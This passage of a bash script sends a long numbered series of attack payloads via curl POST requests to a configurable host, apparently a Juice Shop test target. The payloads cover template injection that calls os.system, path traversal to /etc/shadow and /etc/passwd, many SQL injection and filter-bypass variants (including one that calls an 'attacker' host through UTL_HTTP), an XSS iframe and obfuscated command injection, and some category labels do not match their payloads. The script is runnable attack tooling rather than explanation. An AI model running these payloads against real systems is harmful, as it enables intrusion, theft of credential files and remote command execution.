printf '    payload: %s\n' '$\{self.template._mmarker.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0263 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.cache.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.cache.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0264 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0265 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0266 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0267 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0268 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0269 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.filters.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.filters.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0270 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0271 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0272 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template._mmarker.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template._mmarker.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0273 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0274 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0275 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0276 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.cache.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0277 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0278 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0279 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template._mmarker.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0280 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.filters.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0281 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0282 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0283 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.traceback.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0284 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..%2f..%2f..%2fwin.ini'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%2f..%2f..%2fwin.ini"}' | head -8
echo
echo "=== juiceshop-0285 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '/var/www/html/../../../etc/shadow'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "/var/www/html/../../../etc/shadow"}' | head -8
echo
echo "=== juiceshop-0286 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..\\\\..\\\\..\\\\boot.ini'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..\\\\\\\\..\\\\\\\\..\\\\\\\\boot.ini"}' | head -8
echo
echo "=== juiceshop-0287 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/**/OR/**/1/**/=/**/1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/**/OR/**/1/**/=/**/1--"}' | head -8
echo
echo "=== juiceshop-0288 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''%09OR%091=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''%09OR%091=1"}' | head -8
echo
echo "=== juiceshop-0289 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''%20oR%201=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''%20oR%201=1--"}' | head -8
echo
echo "=== juiceshop-0290 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''+UNION+SELECT+NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''+UNION+SELECT+NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0291 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/*!12345OR*/1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/*!12345OR*/1=1--"}' | head -8
echo
echo "=== juiceshop-0292 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''+/*!00000SELECT*/+NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''+/*!00000SELECT*/+NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0293 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND 1=1#'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND 1=1#"}' | head -8
echo
echo "=== juiceshop-0294 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR TRUE--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR TRUE--"}' | head -8
echo
echo "=== juiceshop-0295 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND SLEEP(3)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND SLEEP(3)--"}' | head -8
echo
echo "=== juiceshop-0296 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''%2f**%2fOR%2f**%2f1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''%2f**%2fOR%2f**%2f1=1--"}' | head -8
echo
echo "=== juiceshop-0297 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' or '\''1'\''='\''1'\'' --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' or '\''1'\''='\''1'\'' --"}' | head -8
echo
echo "=== juiceshop-0298 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1 or 1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1 or 1=1"}' | head -8
echo
echo "=== juiceshop-0299 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '0'\'' OR 1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "0'\'' OR 1=1--"}' | head -8
echo
echo "=== juiceshop-0300 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1 LIMIT 1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1 LIMIT 1--"}' | head -8
echo
echo "=== juiceshop-0301 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||UTL_HTTP.REQUEST('\''http://attacker'\'')'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||UTL_HTTP.REQUEST('\''http://attacker'\'')"}' | head -8
echo
echo "=== juiceshop-0302 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||CHR(97)||CHR(98)||CHR(99)=abc'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||CHR(97)||CHR(98)||CHR(99)=abc"}' | head -8
echo
echo "=== juiceshop-0303 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' UNION/**/SELECT/**/NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0304 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' or if(1=1,sleep(2),0)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' or if(1=1,sleep(2),0)--"}' | head -8
echo
echo "=== juiceshop-0305 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '0x27206f7220313d31--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "0x27206f7220313d31--"}' | head -8
echo
echo "=== juiceshop-0306 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%u0027%20OR%201=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%u0027%20OR%201=1--"}' | head -8
echo
echo "=== juiceshop-0307 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%2527%2520OR%25201=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2527%2520OR%25201=1--"}' | head -8
echo
echo "=== juiceshop-0308 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27UNION%0ASELECT%0ANULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27UNION%0ASELECT%0ANULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0309 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--"}' | head -8
echo
echo "=== juiceshop-0310 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' AND (SELECT sleep(3))--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' AND (SELECT sleep(3))--"}' | head -8
echo
echo "=== juiceshop-0311 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR EXISTS(SELECT * FROM users)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR EXISTS(SELECT * FROM users)--"}' | head -8
echo
echo "=== juiceshop-0312 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--"}' | head -8
echo
echo "=== juiceshop-0313 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1/**/OR/**/'\''1'\''/**/=/**/'\''1"}' | head -8
echo
echo "=== juiceshop-0314 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1+oR+1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1+oR+1=1"}' | head -8
echo
echo "=== juiceshop-0315 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1%0bOR%0b1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1%0bOR%0b1=1"}' | head -8
echo
echo "=== juiceshop-0316 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '1/**/oR/**/1/**/=/**/1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1/**/oR/**/1/**/=/**/1"}' | head -8
echo
echo "=== juiceshop-0317 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '0'\''/**/UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "0'\''/**/UNION/**/SELECT/**/NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0318 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||mid(version(),1,1)=5'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||mid(version(),1,1)=5"}' | head -8
echo
echo "=== juiceshop-0319 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''--%00'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''--%00"}' | head -8
echo
echo "=== juiceshop-0320 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '/etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "/etc/passwd"}' | head -8
echo
echo "=== juiceshop-0321 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/**/UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/**/UNION/**/SELECT/**/NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0322 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1"}' | head -8
echo
echo "=== juiceshop-0323 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<IFRAME SRC="jav&#x09;ascript:alert(1)">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<IFRAME SRC=\"jav&#x09;ascript:alert(1)\">"}' | head -8
echo
echo "=== juiceshop-0324 | tuning=lfi | method=POST-body ==="
printf '    payload: %s\n' '....%5C....%5C....%5Cetc%5Cpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "....%5C....%5C....%5Cetc%5Cpasswd"}' | head -8
echo
echo "=== juiceshop-0325 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' AND 1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' AND 1=1--"}' | head -8
echo
echo "=== juiceshop-0326 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '1'\''||'\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''||'\''1"}' | head -8
echo
echo "=== juiceshop-0327 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''--"}' | head -8
echo
echo "=== juiceshop-0328 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'';--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'';--"}' | head -8
echo
echo "=== juiceshop-0329 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1%27--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1%27--"}' | head -8
echo
echo "=== juiceshop-0330 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''/**/OR/**/1/**/=/**/1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''/**/OR/**/1/**/=/**/1--"}' | head -8
echo
echo "=== juiceshop-0331 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''/*+*/OR/*+*/1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''/*+*/OR/*+*/1=1--"}' | head -8
echo
echo "=== juiceshop-0332 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' oR '\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' oR '\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0333 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' oR 1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' oR 1=1--"}' | head -8
echo
echo "=== juiceshop-0334 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%31%27%20--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%31%27%20--"}' | head -8
echo
echo "=== juiceshop-0335 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' --"}' | head -8
echo
echo "=== juiceshop-0336 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%2F**%2FOR%2F**%2F1%3D1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%2F**%2FOR%2F**%2F1%3D1--"}' | head -8
echo
echo "=== juiceshop-0337 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1 AND 1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1 AND 1=1"}' | head -8
echo
echo "=== juiceshop-0338 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1 OR 1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1 OR 1=1"}' | head -8
echo
echo "=== juiceshop-0339 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ''\''||'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||"}' | head -8
echo
echo "=== juiceshop-0340 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ''\''||1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||1"}' | head -8
echo
echo "=== juiceshop-0341 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1-- -'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1-- -"}' | head -8
echo
echo "=== juiceshop-0342 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' 'sh$\{IFS\}-c$\{IFS\}whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "sh$\\{IFS\\}-c$\\{IFS\\}whoami"}' | head -8
echo
echo "=== juiceshop-0343 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' 'bash$\{IFS\}-c$\{IFS\}'\''id'\'''
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "bash$\\{IFS\\}-c$\\{IFS\\}'\''id'\''"}' | head -8
echo
echo "=== juiceshop-0344 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '$\{IFS\}'\''id'\''}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{IFS\\}'\''id'\''}"}' | head -8
echo
